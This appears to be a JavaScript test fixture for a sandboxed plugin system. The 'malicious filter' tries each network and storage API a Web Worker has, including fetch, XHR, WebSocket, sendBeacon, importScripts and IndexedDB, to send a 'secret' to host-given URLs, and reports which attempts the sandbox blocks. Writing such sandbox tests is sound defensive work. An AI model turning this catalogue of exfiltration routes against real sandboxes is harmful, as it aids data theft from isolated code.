// Malicious filter (#27): tries to send data out of the sandbox with each network API a Worker has. The host message
// `attack` carries the targets (`{ targets: [url, …] }`: the host's own origin and another one); the script answers
// `report` with `{ <attempt>: 'blocked' | 'OPEN: <how>' }`. Any 'OPEN' is a hole in the sandbox (spec §15.1).

const WAIT_MS = 3000

/** Resolves to 'blocked' when `fn` throws, rejects or gives nothing, to 'OPEN: …' when a request went through. */
async function attempt(fn) {
  try {
    const result = await Promise.race([fn(), new Promise((resolve) => setTimeout(() => resolve('timeout'), WAIT_MS))])
    return result === undefined || result === false || result === 'timeout' ? 'blocked' : `OPEN: ${String(result)}`
  } catch {
    return 'blocked'
  }
}

/** Waits for an object with `onload`/`onopen` and `onerror` events: true once it loaded or opened. */
function settled(target, ok) {
  return new Promise((resolve) => {
    target[ok] = () => resolve(true)
    target.onerror = () => resolve(false)
    target.onclose = () => resolve(false)
  })
}

const g = globalThis

function attacks(url, ws) {
  return {
    fetch: async () => (await g.fetch(url)).status,
    fetchNoCors: async () => (await g.fetch(url, { mode: 'no-cors' })).type,
    fetchKeepalive: async () => (await g.fetch(url, { method: 'POST', body: 'secret', keepalive: true })).status,
    request: async () => (await g.fetch(new g.Request(url))).status,
    xhr: () => {
      const x = new g.XMLHttpRequest()
      x.open('POST', url)
      const done = settled(x, 'onload')
      x.send('secret')
      return done
    },
    xhrSync: () => {
      const x = new g.XMLHttpRequest()
      x.open('GET', url, false)
      x.send()
      return x.status || undefined
    },
    webSocket: () => settled(new g.WebSocket(ws), 'onopen'),
    webSocketStream: async () => !!(await new g.WebSocketStream(ws).opened),
    webTransport: async () => !!(await new g.WebTransport(url).ready),
    eventSource: () => settled(new g.EventSource(url), 'onopen'),
    importScripts: () => {
      g.importScripts(url)
      return true
    },
    dynamicImport: async () => !!(await import(url)),
    sendBeacon: () => g.navigator.sendBeacon(url, 'secret'),
    worker: () => new Promise((resolve) => {
      const w = new g.Worker(url)
      w.onerror = () => resolve(false)
      w.onmessage = () => resolve(true)
    }),
    sharedWorker: () => new Promise((resolve) => {
      const w = new g.SharedWorker(url)
      w.onerror = () => resolve(false)
      w.port.onmessage = () => resolve(true)
    }),
    // A font or an image fetched by URL: no network either (`default-src 'none'`).
    fontFace: async () => !!(await new g.FontFace('evil', `url(${url})`).load()),
    imageBitmap: async () => !!(await g.createImageBitmap(await (await g.fetch(url)).blob())),
    // WebAssembly streaming needs a Response.
    wasmStreaming: async () => !!(await g.WebAssembly.compileStreaming(g.fetch(url))),
    // Storage: nothing shared with the host or persisted between filters.
    indexedDB: () => settled(g.indexedDB.open('evil'), 'onsuccess'),
    caches: async () => !!(await g.caches.open('evil')),
    broadcastChannel: () => {
      new g.BroadcastChannel('evil').postMessage('secret')
      return true
    },
  }
}

export default {
  on: {
    async 'message:attack'(f, { data }) {
      const report = {}
      for (const [i, target] of data.targets.entries()) {
        const url = `${target}?secret=${i}`
        const ws = target.replace(/^http/, 'ws')
        for (const [name, fn] of Object.entries(attacks(url, ws))) report[`${name}@${i}`] = await attempt(fn)
      }
      f.emit('report', report)
    },
  },
}
